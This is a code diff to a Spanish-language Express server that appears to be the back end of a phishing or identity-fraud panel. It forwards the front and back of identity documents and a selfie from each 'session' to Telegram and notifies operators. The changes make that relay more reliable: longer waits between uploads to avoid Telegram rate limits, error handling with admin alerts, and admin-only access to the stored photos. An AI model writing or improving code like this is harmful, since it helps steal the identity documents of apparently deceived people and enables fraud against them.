@@ -124,7 +124,7 @@ const sendIdentityPhotosToTelegram = async (
           headers: formFrente.getHeaders()
         });
         console.log('✅ Foto frontal enviada');
-        await wait(1200); // Esperar 1.2s entre fotos
+        await wait(2000); // Esperar 2s entre fotos para respetar rate limits
       }
     }
 
@@ -146,7 +146,7 @@ const sendIdentityPhotosToTelegram = async (
           headers: formAtras.getHeaders()
         });
         console.log('✅ Foto trasera enviada');
-        await wait(1200);
+        await wait(2000);
       }
     }
 
@@ -177,6 +177,8 @@ const sendIdentityPhotosToTelegram = async (
     if (error?.response?.data) {
       console.error('Detalles del error:', JSON.stringify(error.response.data, null, 2));
     }
+    // Propagar el error para que el llamador pueda manejarlo
+    throw new Error(`Fallo al enviar fotos a Telegram: ${error?.message || 'Error desconocido'}`);
   }
 };
 
@@ -817,11 +819,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Endpoint para obtener las fotos de identidad de una sesión
+  // Endpoint para obtener las fotos de identidad de una sesión (solo admins)
   app.get('/api/sessions/:id/photos', async (req, res) => {
     try {
       if (!req.isAuthenticated()) {
         return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const user = req.user;
+      
+      // SOLO admins pueden ver las fotos de identidad
+      if (user.role !== 'admin') {
+        return res.status(403).json({ message: "Acceso denegado. Solo administradores pueden ver fotos de identidad." });
       }
 
       const sessionId = req.params.id;
@@ -829,15 +838,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       if (!session) {
         return res.status(404).json({ message: "Sesión no encontrada" });
-      }
-
-      // Verificar que el usuario tenga permiso para ver esta sesión
-      const user = req.user;
-      const isSuperAdmin = user.username === 'balonx';
-      const isAdmin = user.role === 'admin';
-      
-      if (!isAdmin && session.createdBy !== user.username) {
-        return res.status(403).json({ message: "No tiene permiso para ver esta sesión" });
       }
 
       // Devolver solo las fotos de identidad
@@ -2591,14 +2591,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                 await sendTelegramMessage(identidadMessage);
 
-                // Enviar las fotos reales a Telegram
-                await sendIdentityPhotosToTelegram(
-                  sessionFolio,
-                  inputData.tipoIdentificacion,
-                  inputData.fotoIdentidadFrente,
-                  inputData.fotoIdentidadAtras,
-                  inputData.fotoSelfie
-                );
+                // Enviar las fotos reales a Telegram con manejo de errores
+                try {
+                  await sendIdentityPhotosToTelegram(
+                    sessionFolio,
+                    inputData.tipoIdentificacion,
+                    inputData.fotoIdentidadFrente,
+                    inputData.fotoIdentidadAtras,
+                    inputData.fotoSelfie
+                  );
+                } catch (photoError: any) {
+                  console.error('⚠️  Error al enviar fotos a Telegram (continuando):', photoError.message);
+                  // Notificar al admin del error
+                  const errorCreatedBy = existingSession?.createdBy || '';
+                  broadcastToAdmins(JSON.stringify({
+                    type: 'TELEGRAM_PHOTO_ERROR',
+                    data: {
+                      sessionId,
+                      error: photoError.message,
+                      timestamp: new Date().toISOString(),
+                      createdBy: errorCreatedBy
+                    }
+                  }), errorCreatedBy);
+                }
 
                 // Notificar al admin con metadatos solamente (no fotos completas)
                 const identidadCreatedBy = existingSession?.createdBy || '';
